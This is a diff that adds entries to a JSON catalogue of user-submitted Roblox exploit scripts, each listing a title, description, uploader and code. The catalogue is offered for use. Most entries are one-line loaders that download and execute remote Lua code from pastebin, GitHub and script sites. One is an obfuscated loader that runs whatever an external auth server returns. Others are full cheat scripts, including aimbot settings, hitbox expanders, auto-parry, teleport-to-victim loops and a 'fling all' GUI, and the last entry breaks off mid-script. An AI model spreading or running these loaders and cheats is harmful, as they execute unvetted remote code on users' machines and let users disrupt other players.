@@ -15735,6 +15735,486 @@
       "Script_Title": "c0kkahubbllx frui",
       "User_ID": 7093737426,
       "Username": "TEAM_lPRO0"
+    },
+    "Script2247": {
+      "Date": "December 01 2024",
+      "Description": "script  fe universal ring giant😎👍",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Universal-Script-Projeto-LKB-I-Super-Ring-V3-I-Cracked-23346\"))()",
+      "Script_Title": "super ring v3",
+      "User_ID": 1689021662,
+      "Username": "kalel1596"
+    },
+    "Script2248": {
+      "Date": "December 01 2024",
+      "Description": "this script works only in r6 games like Just baseplane, which has a backdoor",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Universal-Script-FE-achromatic-swords-roblox-script-5294\"))()",
+      "Script_Title": "fe achromoatic r6",
+      "User_ID": 1689021662,
+      "Username": "kalel1596"
+    },
+    "Script2249": {
+      "Date": "December 01 2024",
+      "Description": "ghost  hud",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Universal-Script-GhostHub-16534\"))()",
+      "Script_Title": "ghost hub",
+      "User_ID": 5399089389,
+      "Username": "real_Straykids3"
+    },
+    "Script2250": {
+      "Date": "December 01 2024",
+      "Description": "Arceus x copy infinite key same as acreus x and cool",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Universal-Script-Arceus-X-Executor-22878\"))()",
+      "Script_Title": "Arceus x",
+      "User_ID": 5711397392,
+      "Username": "GTCIRJDUCJSTT"
+    },
+    "Script2251": {
+      "Date": "December 01 2024",
+      "Description": "Só deixa invisivel",
+      "Script": "loadstring(game:HttpGet('https://pastebin.com/raw/3Rnd9rHf'))()",
+      "Script_Title": "Hx Gui invisível ",
+      "User_ID": 7357975995,
+      "Username": "kinito_pet118"
+    },
+    "Script2252": {
+      "Date": "December 01 2024",
+      "Description": "Shiftlock works on every executor and moveable aim circle and if you die you wont lose it",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Universal-Script-Permanent-Shiftlock-V2-14049\"))()",
+      "Script_Title": "Shiftlock permanent",
+      "User_ID": 5711397392,
+      "Username": "GTCIRJDUCJSTT"
+    },
+    "Script2253": {
+      "Date": "December 01 2024",
+      "Description": "Shows every player outlined and name shows ",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Universal-Script-Universal-ESP-6338\"))()",
+      "Script_Title": "Esp",
+      "User_ID": 5711397392,
+      "Username": "GTCIRJDUCJSTT"
+    },
+    "Script2254": {
+      "Date": "December 01 2024",
+      "Description": "makes you let draw and chat it",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Universal-Script-Fe-Chat-Draw-Mobile-Supported-18040\"))()",
+      "Script_Title": "Chat drawer",
+      "User_ID": 5711397392,
+      "Username": "GTCIRJDUCJSTT"
+    },
+    "Script2255": {
+      "Date": "December 01 2024",
+      "Description": "energize gives you many activities for R15 and R6 ",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Universal-Script-Energize-10408\"))()",
+      "Script_Title": "Energize emotes",
+      "User_ID": 5711397392,
+      "Username": "GTCIRJDUCJSTT"
+    },
+    "Script2256": {
+      "Date": "December 01 2024",
+      "Description": "you can move parts like in Btools may glitch or not work sometimes it works",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Universal-Script-part-mover-14127\"))()",
+      "Script_Title": "Part mover",
+      "User_ID": 5711397392,
+      "Username": "GTCIRJDUCJSTT"
+    },
+    "Script2257": {
+      "Date": "December 01 2024",
+      "Description": "you can join any youtuber but you need Username/Userid and Place id the code id of the Se.",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Universal-Script-Synapse-X-Stream-Sniper-5814\"))()",
+      "Script_Title": "Stream sniper",
+      "User_ID": 5711397392,
+      "Username": "GTCIRJDUCJSTT"
+    },
+    "Script2258": {
+      "Date": "December 01 2024",
+      "Description": "All emotes and animations for free",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Universal-Script-AFEM-14048\"))()",
+      "Script_Title": "Emote menu",
+      "User_ID": 5711397392,
+      "Username": "GTCIRJDUCJSTT"
+    },
+    "Script2259": {
+      "Date": "December 01 2024",
+      "Description": "nice",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/skibiditoiletfan2007/BaldyToSorcerer/main/Latest.lua\"))(all)",
+      "Script_Title": "gojo",
+      "User_ID": 5783519147,
+      "Username": "amine12345976"
+    },
+    "Script2260": {
+      "Date": "December 02 2024",
+      "Description": "Tanti scripts blade ball",
+      "Script": "loadstring(game:HttpGet(\"https://github.com/Stang001/pulawat/blob/main/BladeBall.lua?raw=true\"))()",
+      "Script_Title": "Tanti Blade ball",
+      "User_ID": 7468723834,
+      "Username": "Robloxian_100028"
+    },
+    "Script2261": {
+      "Date": "December 02 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet((\"https://raw.githubusercontent.com/RTHRTHTH3R34/POP-IT-TRADING-GO/main/README.md\"), true))()",
+      "Script_Title": "to be number 1",
+      "User_ID": 6143269423,
+      "Username": "Aamon6969"
+    },
+    "Script2262": {
+      "Date": "December 01 2024",
+      "Description": "key Free_Shadow77",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Brookhaven-RP-Shadow-Hub-Update-23486\"))()",
+      "Script_Title": "Hx Hub 🇧🇷",
+      "User_ID": 7357975995,
+      "Username": "kinito_pet118"
+    },
+    "Script2263": {
+      "Date": "December 01 2024",
+      "Description": "wow",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/skibiditoiletfan2007/BaldyToSorcerer/main/Latest.lua\"))()",
+      "Script_Title": "gojo Fe script",
+      "User_ID": 5783519147,
+      "Username": "amine12345976"
+    },
+    "Script2264": {
+      "Date": "December 02 2024",
+      "Description": " This is not FE script kill and kick It only works for you 💀",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Universal-Script-NEW-UPATE-TO-NEW-HUBS-18453\"))()",
+      "Script_Title": "kill kick heal Gui",
+      "User_ID": 6221247402,
+      "Username": "mfellxpa"
+    },
+    "Script2265": {
+      "Date": "December 01 2024",
+      "Description": "Só uma gui",
+      "Script": "loadstring(game:HttpGet(\"https://pastebin.com/raw/HrbT6bNK\",true))()",
+      "Script_Title": "Hx Gui Invisible(Op)",
+      "User_ID": 7357975995,
+      "Username": "kinito_pet118"
+    },
+    "Script2266": {
+      "Date": "December 02 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Blox-Fruits-Redz-Hub-Fixed-22672\"))()",
+      "Script_Title": "redz hub fixed",
+      "User_ID": 4323697356,
+      "Username": "ere867745"
+    },
+    "Script2267": {
+      "Date": "December 02 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Universal-Script-Hug-Gui-R6-17818\"))()",
+      "Script_Title": ".",
+      "User_ID": 5057202642,
+      "Username": "omg1hack0"
+    },
+    "Script2268": {
+      "Date": "December 01 2024",
+      "Description": "Made by SABUTON1238",
+      "Script": "-- Crear la GUI\nlocal screenGui = Instance.new(\"ScreenGui\")\nscreenGui.Parent = game.Players.LocalPlayer:WaitForChild(\"PlayerGui\")\n\n-- Crear el marco contenedor\nlocal mainFrame = Instance.new(\"Frame\")\nmainFrame.Size = UDim2.new(0, 220, 0, 180)\nmainFrame.Position = UDim2.new(0.5, -110, 0.4, 0)\nmainFrame.BackgroundColor3 = Color3.new(1, 1, 1) -- Fondo blanco\nmainFrame.BorderSizePixel = 0\nmainFrame.Parent = screenGui\n\n-- Crear la barra de título\nlocal titleBar = Instance.new(\"Frame\")\ntitleBar.Size = UDim2.new(1, 0, 0, 30)\ntitleBar.BackgroundColor3 = Color3.new(1, 1, 0) -- Fondo amarillo\ntitleBar.BorderSizePixel = 0\ntitleBar.Parent = mainFrame\n\n-- Texto de la barra de título\nlocal titleText = Instance.new(\"TextLabel\")\ntitleText.Size = UDim2.new(1, 0, 1, 0)\ntitleText.BackgroundTransparency = 1\ntitleText.Text = \"Animation Player\"\ntitleText.TextColor3 = Color3.new(0, 0, 0) -- Texto negro\ntitleText.Font = Enum.Font.SourceSans\ntitleText.TextSize = 18\ntitleText.Parent = titleBar\n\n-- Crear el cuadro de texto para el ID de animación\nlocal textBox = Instance.new(\"TextBox\")\ntextBox.Size = UDim2.new(0, 200, 0, 50)\ntextBox.Position = UDim2.new(0.5, -100, 0.3, 0)\ntextBox.PlaceholderText = \"Introduce el ID de animación\"\ntextBox.BackgroundColor3 = Color3.new(1, 1, 1) -- Fondo blanco\ntextBox.TextColor3 = Color3.new(0, 0, 0) -- Texto negro\ntextBox.Parent = mainFrame\n\n-- Crear el botón de reproducción\nlocal playButton = Instance.new(\"TextButton\")\nplayButton.Size = UDim2.new(0, 100, 0, 50)\nplayButton.Position = UDim2.new(0.5, -100, 0.6, 0)\nplayButton.Text = \"Reproducir\"\nplayButton.BackgroundColor3 = Color3.new(1, 1, 1) -- Fondo blanco\nplayButton.TextColor3 = Color3.new(0, 0, 0) -- Texto negro\nplayButton.Parent = mainFrame\n\n-- Crear el botón de detener\nlocal stopButton = Instance.new(\"TextButton\")\nstopButton.Size = UDim2.new(0, 100, 0, 50)\nstopButton.Position = UDim2.new(0.5, 0, 0.6, 0)\nstopButton.Text = \"Detener\"\nstopButton.BackgroundColor3 = Color3.new(1, 1, 1) -- Fondo blanco\nstopButton.TextColor3 = Color3.new(0, 0, 0) -- Texto negro\nstopButton.Parent = mainFrame\n\n-- Crear variables para el reproductor de animación\nlocal player = game.Players.LocalPlayer\nlocal character = player.Character or player.CharacterAdded:Wait()\nlocal humanoid = character:WaitForChild(\"Humanoid\")\nlocal animation\nlocal animationTrack\n\n-- Función para reproducir la animación\nlocal function playAnimation()\n    local animationId = tonumber(textBox.Text)\n    if animationId then\n        if animationTrack then\n            animationTrack:Stop() -- Detener cualquier animación previa\n        end\n\n        animation = Instance.new(\"Animation\")\n        animation.AnimationId = \"rbxassetid://\" .. animationId\n\n        animationTrack = humanoid:LoadAnimation(animation)\n        animationTrack:Play()\n    else\n        warn(\"ID de animación no válido.\")\n    end\nend\n\n-- Función para detener la animación\nlocal function stopAnimation()\n    if animationTrack then\n        animationTrack:Stop()\n    end\nend\n\n-- Conectar las funciones a los botones\nplayButton.MouseButton1Click:Connect(playAnimation)\nstopButton.MouseButton1Click:Connect(stopAnimation)\n\n-- Hacer que el marco principal sea movible en dispositivos móviles usando la barra de título\nlocal isDragging = false\nlocal dragStart\nlocal startPos\n\ntitleBar.InputBegan:Connect(function(input)\n    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then\n        isDragging = true\n        dragStart = input.Position\n        startPos = mainFrame.Position\n\n        input.Changed:Connect(function()\n            if input.UserInputState == Enum.UserInputState.End then\n                isDragging = false\n            end\n        end)\n    end\nend)\n\ntitleBar.InputChanged:Connect(function(input)\n    if isDragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then\n        local delta = input.Position - dragStart\n        mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)\n    end\nend)",
+      "Script_Title": "Animation Player",
+      "User_ID": 2233074357,
+      "Username": "sh1meju10"
+    },
+    "Script2269": {
+      "Date": "December 01 2024",
+      "Description": "",
+      "Script": "getgenv().mainKey = \"nil\"; \nlocal a,b,c,d,e=loadstring,request or http_request or (http and http.request) or (syn and syn.request),assert,tostring,\"https\\58//api.eclipsehub.xyz/auth\";c(a and b,\"Executor not Supported\")a(b({Url=e..\"\\?\\107e\\121\\61\"..d(mainKey),Headers={[\"User-Agent\"]=\"Eclipse\"}}).Body)()",
+      "Script_Title": "Eclipse hub",
+      "User_ID": 2360074157,
+      "Username": "iangatito123ghf"
+    },
+    "Script2270": {
+      "Date": "December 01 2024",
+      "Description": "",
+      "Script": "\nloadstring(game:HttpGet('https://raw.githubusercontent.com/tobi437a/Scripts/refs/heads/main/b8f0bd2293cb151c74ef0597.lua'))()",
+      "Script_Title": "pls donate ",
+      "User_ID": 7345018745,
+      "Username": "villian_JJ"
+    },
+    "Script2271": {
+      "Date": "December 01 2024",
+      "Description": "key: VisualOnTop!",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/VisualBETA/Visual-BETA/refs/heads/main/VisualBETA-Loader\"))()",
+      "Script_Title": "blade Ball visual",
+      "User_ID": 7620011917,
+      "Username": "beholvd"
+    },
+    "Script2272": {
+      "Date": "December 01 2024",
+      "Description": "this script has aimbot, esp, autofarms, and a amazing variety of things.",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/Scripterxzx/MM2-SCRIPT-OP-/refs/heads/main/MM2%20OP%20SCRIPT\"))()",
+      "Script_Title": "MM2 OP SCRIPT",
+      "User_ID": 5098155203,
+      "Username": "SinnVamp"
+    },
+    "Script2273": {
+      "Date": "December 01 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet('https://raw.githubusercontent.com/TheDarkoneMarcillisePex/The-Elite-Soldier/main/DarkWare'))()",
+      "Script_Title": "Potilid",
+      "User_ID": 5769451074,
+      "Username": "tattichunks"
+    },
+    "Script2274": {
+      "Date": "December 02 2024",
+      "Description": "Ģ̡ͨ̿E̡̱͇̘̻͕̣̳̗̫̤ͬ̉̉͂͒̓͌̌͒̓͠T̷̹̱̙͈͚͎̦͓ͣ̊͌̔̃̃ͣͅ ",
+      "Script": "setclipboard(\"https://discord.gg/UgQAPcBtpy\")\nprint(\"made by khen\")\n\ngetgenv().phyx_target = {\n    [\"Main\"] = {\n       [\"Prediction\"] = { Horizontal = 0.1419839, Vertical = 0.1419839 }, -- // AutoPred will save u\n       [\"Partz\"] = { \"UpperTorso\", \"Head\", \"UpperTorso\" },\n       [\"Air Delay\"] = { true, delay = 0.14, delay2 = 0.37 }, -- // Ts will also be auto set-up if you turn on ping based.\n       [\"Ping Based\"] = all, -- // Options: \"vertical\", \"horizontal\", \"all\" ( auto air included if u putted \"vertical\" or \"all\")\n       [\"Resolver Smoothness\"] = 0.110,\n       [\"Dot\"] = true,\n       [\"Notification\"] = true,\n       [\"Knock Unlock\"] = true,\n       [\"Look At\"] = true -- // not done\n    },\n    [\"Aim Assist\"] = {\n       [\"Cam Enabled\"] = true,\n       [\"Partz\"] = \"UpperTorso\",\n       [\"Use Smoothness\"] = true,\n       [\"Smoothness Value\"] = 0.61\n    },\n    [\"GUIs\"] = {\n       [\"Big Gui\"] = true,\n       [\"Save Position\"] = true,\n       [\"Auto Air\"] = true,\n       [\"Buy Items\"] = true, -- // Only works on VFS games.\n       [\"Reset\"] = false,\n       [\"Leave\"] = false,\n       [\"Bullet Tp\"] = true, -- //  works most dh games\n       [\"Trigger Bot\"] = { true, delay = 0.5 }, -- // under maintenance, but works without delay.\n       [\"Macro\"] = { true, type = \"Legit\" } -- // Can be: \"Legit\" , \"Speed\" , \"CFrame\".\n    }\n}\n\n\nloadstring(game:HttpGet(\"https://raw.githubusercontent.com/khen791/script-khen/refs/heads/main/why%20u.lua\"))();",
+      "Script_Title": "the best da hood aim",
+      "User_ID": 7650260804,
+      "Username": "Helloroblox15657"
+    },
+    "Script2275": {
+      "Date": "December 02 2024",
+      "Description": "Auto piano 3 vesions (NEED KEY)",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/MADNESSTEST/Pqoeirnfjw/main/AP3-5.lua\", true))()",
+      "Script_Title": "Auto piano",
+      "User_ID": 2635078580,
+      "Username": "eldar999445"
+    },
+    "Script2276": {
+      "Date": "December 02 2024",
+      "Description": "(Use Vessel)",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/PERFECTION-Jujutsu-Shenanigans-BETTER-SUKUNA-FOR-JJS-23535\"))()",
+      "Script_Title": "Heian sukuna jjs",
+      "User_ID": 2635078580,
+      "Username": "eldar999445"
+    },
+    "Script2277": {
+      "Date": "December 02 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://pastebin.com/raw/fnimPd4C\"))()",
+      "Script_Title": "you will be sad boy",
+      "User_ID": 7622133356,
+      "Username": "akobudoy123404"
+    },
+    "Script2278": {
+      "Date": "December 02 2024",
+      "Description": "",
+      "Script": "kick (Paakhi_unicorn2023)",
+      "Script_Title": "kick",
+      "User_ID": 3783977599,
+      "Username": "mason_ross2021"
+    },
+    "Script2279": {
+      "Date": "December 02 2024",
+      "Description": "NO NEED KEY",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua\", true))()",
+      "Script_Title": "fisch speed hub (OP)",
+      "User_ID": 4013735645,
+      "Username": "XxSALENDRA"
+    },
+    "Script2280": {
+      "Date": "December 02 2024",
+      "Description": "",
+      "Script": "--[[\r\n\tWARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!\r\n]]\r\n_G.HeadSize = 20\r\n_G.Disabled = true\r\ngame:GetService('RunService').RenderStepped:connect(function()\r\nif _G.Disabled then\r\nfor i,v in next, game:GetService('Players'):GetPlayers() do\r\nif v.Name ~= game:GetService('Players').LocalPlayer.Name then\r\npcall(function()\r\nv.Character.Head.Size = Vector3.new(_G.HeadSize,_G.HeadSize,_G.HeadSize)\r\nv.Character.Head.Transparency = 1\r\nv.Character.Head.BrickColor = BrickColor.new(\"Red\")\r\nv.Character.Head.Material = \"Neon\"\r\nv.Character.Head.CanCollide = false\r\nv.Character.Head.Massless = true\r\nend)\r\nend\r\nend\r\nend\r\nend)",
+      "Script_Title": "unrick combat war",
+      "User_ID": 2439662017,
+      "Username": "unrickroll"
+    },
+    "Script2281": {
+      "Date": "December 02 2024",
+      "Description": "",
+      "Script": "--[[\r\n\tWARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!\r\n]]\r\nlocal lp = game.Players.LocalPlayer\r\n \r\nlocal animationInfo = {}\r\n \r\nfunction getInfo(id)\r\n  local success, info = pcall(function()\r\n      return game:GetService(\"MarketplaceService\"):GetProductInfo(id)\r\n  end)\r\n  if success then\r\n      return info\r\n  end\r\n  return {Name=''}\r\nend\r\nfunction block(player)\r\n  keypress(0x46)\r\n  wait()\r\n  keyrelease(0x46)\r\nend\r\n \r\nlocal AnimNames = {\r\n  'Slash',\r\n  'Swing',\r\n  'Sword'\r\n}\r\n \r\nfunction playerAdded(v)\r\n    local function charadded(char)\r\n      local humanoid = char:WaitForChild(\"Humanoid\", 5)\r\n      if humanoid then\r\n          humanoid.AnimationPlayed:Connect(function(track)\r\n              local info = animationInfo[track.Animation.AnimationId]\r\n              if not info then\r\n                  info = getInfo(tonumber(track.Animation.AnimationId:match(\"%d+\")))\r\n                  animationInfo[track.Animation.AnimationId] = info\r\n              end\r\n \r\n              if (lp.Character and lp.Character:FindFirstChild(\"Head\") and v.Character:FindFirstChild(\"Head\")) then\r\n                  local mag = (v.Character.Head.Position - lp.Character.Head.Position).Magnitude\r\n                  if mag < 15  then\r\n \r\n                      for _, animName in pairs(AnimNames) do\r\n                          if info.Name:match(animName) then\r\n                              pcall(block, v)\r\n                          end\r\n                      end\r\n \r\n                  end\r\n              end\r\n          end)\r\n      end\r\n  end\r\n \r\n  if v.Character then\r\n      charadded(v.Character)\r\n  end\r\n  v.CharacterAdded:Connect(charadded)\r\nend\r\n \r\nfor i,v in pairs(game.Players:GetPlayers()) do\r\n   if v ~= lp then\r\n       playerAdded(v)\r\n   end\r\nend\r\n \r\ngame.Players.PlayerAdded:Connect(playerAdded)",
+      "Script_Title": "unrickroll auto parr",
+      "User_ID": 2439662017,
+      "Username": "unrickroll"
+    },
+    "Script2282": {
+      "Date": "December 02 2024",
+      "Description": "FAXGG not so OP script.but pretty good",
+      "Script": "loadstring(game:HttpGet(\"https://pastebin.com/raw/EV1uCYWR\"))()",
+      "Script_Title": "FaxGG Blade Ball",
+      "User_ID": 7468723834,
+      "Username": "Robloxian_100028"
+    },
+    "Script2283": {
+      "Date": "December 02 2024",
+      "Description": "",
+      "Script": "_G.HeadSize = 10\n_G.Disabled = true\n \ngame:GetService('RunService').RenderStepped:connect(function()\nif _G.Disabled then\nfor i,v in next, game:GetService('Players'):GetPlayers() do\nif v.Name ~= game:GetService('Players').LocalPlayer.Name then\npcall(function()\nv.Character.HumanoidRootPart.Size = Vector3.new(_G.HeadSize,_G.HeadSize,_G.HeadSize)\nv.Character.HumanoidRootPart.Transparency = 0.7\nv.Character.HumanoidRootPart.BrickColor = BrickColor.new(\"Really blue\")\nv.Character.HumanoidRootPart.Material = \"Neon\"\nv.Character.HumanoidRootPart.CanCollide = false\nend)\nend\nend\nend\nend)",
+      "Script_Title": "murder vs sheriff",
+      "User_ID": 1552401298,
+      "Username": "soscsosv"
+    },
+    "Script2284": {
+      "Date": "December 02 2024",
+      "Description": "when you use this scriptplsbe agoodhackerinnaturaldisaster and helpplayerswhennotjustleave",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Universal-Script-Projeto-LKB-I-Super-Ring-V3-I-Cracked-23346\"))()",
+      "Script_Title": "Super Ring V3",
+      "User_ID": 4429649690,
+      "Username": "Bruh_Gamer92"
+    },
+    "Script2285": {
+      "Date": "December 02 2024",
+      "Description": "i made the script with chatgpt i hope you like it:)",
+      "Script": "-- GUI erstellen\nlocal screenGui = Instance.new(\"ScreenGui\")\nscreenGui.Parent = game.Players.LocalPlayer:WaitForChild(\"PlayerGui\")\n\n-- TextButton erstellen\nlocal button = Instance.new(\"TextButton\")\nbutton.Size = UDim2.new(0, 200, 0, 50)\nbutton.Position = UDim2.new(0.5, -100, 0.5, -25)\nbutton.Text = \"Walkspeed ändern\"\nbutton.Parent = screenGui\n\n-- Walkspeed standardmäßig auf 16 setzen\nlocal walkSpeed = 16\n\n-- Wenn der Button gedrückt wird, ändere die Walkspeed\nbutton.MouseButton1Click:Connect(function()\n    local player = game.Players.LocalPlayer\n    if player and player.Character then\n        local humanoid = player.Character:FindFirstChild(\"Humanoid\")\n        if humanoid then\n            walkSpeed = walkSpeed == 16 and 50 or 16  -- Toggle zwischen 16 und 50\n            humanoid.WalkSpeed = walkSpeed\n            button.Text = \"Walkspeed: \" .. walkSpeed\n        end\n    end\nend)",
+      "Script_Title": "Walkspeed togglebyme",
+      "User_ID": 4429649690,
+      "Username": "Bruh_Gamer92"
+    },
+    "Script2286": {
+      "Date": "December 02 2024",
+      "Description": "Universal",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/GGH52lan/GGH52lan/main/keyboard.txt\"))()",
+      "Script_Title": "Keyboard",
+      "User_ID": 2798058578,
+      "Username": "sonicefe66"
+    },
+    "Script2287": {
+      "Date": "December 02 2024",
+      "Description": "i made this script and this is a v3 prototype of BruhGUI hope you enjoy it:D",
+      "Script": "-- GUI erstellen\nlocal screenGui = Instance.new(\"ScreenGui\")\nscreenGui.Parent = game.Players.LocalPlayer:WaitForChild(\"PlayerGui\")\nscreenGui.Name = \"BruhGUIv3\"\n\n-- Hintergrundfarbe auf Lila setzen\nlocal frame = Instance.new(\"Frame\")\nframe.Parent = screenGui\nframe.BackgroundColor3 = Color3.fromRGB(128, 0, 128)  -- Lila\nframe.Size = UDim2.new(0, 300, 0, 300)\nframe.Position = UDim2.new(0.5, -150, 0.5, -150)\n\n-- Titel (BruhGUIv3) oben links\nlocal titleLabel = Instance.new(\"TextLabel\")\ntitleLabel.Parent = frame\ntitleLabel.Text = \"BruhGUIv3\"\ntitleLabel.TextColor3 = Color3.fromRGB(0, 0, 0)  -- Schwarz\ntitleLabel.Size = UDim2.new(0, 200, 0, 40)\ntitleLabel.Position = UDim2.new(0, 10, 0, 10)\ntitleLabel.Font = Enum.Font.SourceSans\ntitleLabel.TextSize = 20\n\n-- Walkspeed Button\nlocal walkspeedButton = Instance.new(\"TextButton\")\nwalkspeedButton.Parent = frame\nwalkspeedButton.Text = \"Walkspeed\"\nwalkspeedButton.Size = UDim2.new(0, 260, 0, 40)\nwalkspeedButton.Position = UDim2.new(0, 20, 0, 60)\nwalkspeedButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)  -- Weiß\nwalkspeedButton.Font = Enum.Font.SourceSans\nwalkspeedButton.TextSize = 18\nwalkspeedButton.MouseButton1Click:Connect(function()\n    -- Setze Walkspeed auf 100\n    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 100\nend)\n\n-- Jump Power Button\nlocal jumpButton = Instance.new(\"TextButton\")\njumpButton.Parent = frame\njumpButton.Text = \"Jump Power\"\njumpButton.Size = UDim2.new(0, 260, 0, 40)\njumpButton.Position = UDim2.new(0, 20, 0, 120)\njumpButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)  -- Weiß\njumpButton.Font = Enum.Font.SourceSans\njumpButton.TextSize = 18\njumpButton.MouseButton1Click:Connect(function()\n    -- Setze Jump Power auf 100\n    game.Players.LocalPlayer.Character.Humanoid.JumpPower = 100\nend)\n\n-- Fling All Button\nlocal flingButton = Instance.new(\"TextButton\")\nflingButton.Parent = frame\nflingButton.Text = \"Fling All\"\nflingButton.Size = UDim2.new(0, 260, 0, 40)\nflingButton.Position = UDim2.new(0, 20, 0, 180)\nflingButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)  -- Weiß\nflingButton.Font = Enum.Font.SourceSans\nflingButton.TextSize = 18\nflingButton.MouseButton1Click:Connect(function()\n    -- Gehe zu jedem Spieler auf dem Server und fling ihn\n    for _, player in ipairs(game.Players:GetPlayers()) do\n        if player ~= game.Players.LocalPlayer then\n            -- Teleportiere zu jedem Spieler\n            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame\n            wait(0.5)  -- Kurze Pause zwischen den Teleportationen\n\n            -- Fling die Figur (z.B. hochschleudern)\n            local bodyVelocity = Instance.new(\"BodyVelocity\")\n            bodyVelocity.MaxForce = Vector3.new(10000, 10000, 10000)\n            bodyVelocity.Velocity = Vector3.new(0, 100, 0)  -- Fliegen in die Höhe\n            bodyVelocity.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart\n            wait(0.5)  -- Zeit, um die Flugbewegung zu sehen\n            bodyVelocity:Destroy()\n        end\n    end\nend)\n\n-- Minimieren Button\nlocal minimizeButton = Instance.new(\"TextButton\")\nminimizeButton.Parent = frame\nminimizeButton.Text = \"_\"\nminimizeButton.Size = UDim2.new(0, 40, 0, 40)\nminimizeButton.Position = UDim2.new(1, -40, 0, 10)\nminimizeButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)  -- Weiß\nminimizeButton.Font = Enum.Font.SourceSans\nminimizeButton.TextSize = 24\nminimizeButton.MouseButton1Click:Connect(function()\n    screenGui.Enabled = false  -- Minimiert die GUI\nend)\n\n-- GUI anzeigen\nscreenGui.Enabled = true",
+      "Script_Title": "BruhGUIv3 prototype",
+      "User_ID": 4429649690,
+      "Username": "Bruh_Gamer92"
+    },
+    "Script2288": {
+      "Date": "December 02 2024",
+      "Description": "sus",
+      "Script": "local Victim='Player name here'\nlocal A=Instance.new'Animation'\nA.AnimationId='rbxassetid://148840371'\nlocal P=game:GetService'Players'.LocalPlayer\nlocal C=P.Character or P.CharacterAdded:Wait()\nlocal H=C:WaitForChild'Humanoid':LoadAnimation(A)\nH:Play()\nH:AdjustSpeed(2.5)\ngame:GetService'RunService'.Stepped:Connect(function()\n    C:WaitForChild'HumanoidRootPart'.CFrame=CFrame.new(game:GetService'Players':FindFirstChild(Victim).Character:WaitForChild'HumanoidRootPart'.Position)\nend)",
+      "Script_Title": "sus",
+      "User_ID": 7592782576,
+      "Username": "TRIGRINHO777KK"
+    },
+    "Script2289": {
+      "Date": "December 02 2024",
+      "Description": "",
+      "Script": "--[[\n\tWARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!\n]]\n-- Tiger admin 2.0\nrepeat task.wait() until game:IsLoaded()\nlocal Temp = {Loopkill={},LkTEAMS={}}\nlocal TigerAdmin_UI = Instance.new(\"ScreenGui\")\nlocal Main = Instance.new(\"Frame\")\nlocal UICorner = Instance.new(\"UICorner\")\nlocal CommandsList = Instance.new(\"ScrollingFrame\")\nlocal UIStroke = Instance.new(\"UIStroke\")\nlocal UIListLayout = Instance.new(\"UIListLayout\")\nlocal UIStroke_2 = Instance.new(\"UIStroke\")\nlocal CommandBar = Instance.new(\"TextBox\")\nlocal UIStroke_3 = Instance.new(\"UIStroke\")\nlocal Title = Instance.new(\"TextLabel\")\nlocal Disc = Instance.new(\"TextLabel\")\nlocal Temp_Clone = Instance.new(\"TextButton\")\nlocal UIStroke_4 = Instance.new(\"UIStroke\")\nlocal Notif = Instance.new(\"Frame\")\nlocal UIStroke_5 = Instance.new(\"UIStroke\")\nlocal UICorner_2 = Instance.new(\"UICorner\")\nlocal Text = Instance.new(\"TextLabel\")\nlocal UITextSizeConstraint = Instance.new(\"UITextSizeConstraint\")\nTigerAdmin_UI.Name = \"TigerAdmin_UI\"\nlocal PreferedParent = nil\nxpcall(function()\n\tPreferedParent = (game:GetService(\"CoreGui\"))\n\tTigerAdmin_UI.Parent = PreferedParent\nend, function()\n\tPreferedParent = game:GetService(\"Players\").LocalPlayer:WaitForChild(\"PlayerGui\")\n\tTigerAdmin_UI.Parent = PreferedParent\nend)\nTigerAdmin_UI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling\nTigerAdmin_UI.ResetOnSpawn = false\nMain.Name = \"Main\"\nMain.Parent = TigerAdmin_UI\nMain.BackgroundColor3 = Color3.fromRGB(22, 22, 22)\nMain.BorderColor3 = Color3.fromRGB(0, 0, 0)\nMain.BorderSizePixel = 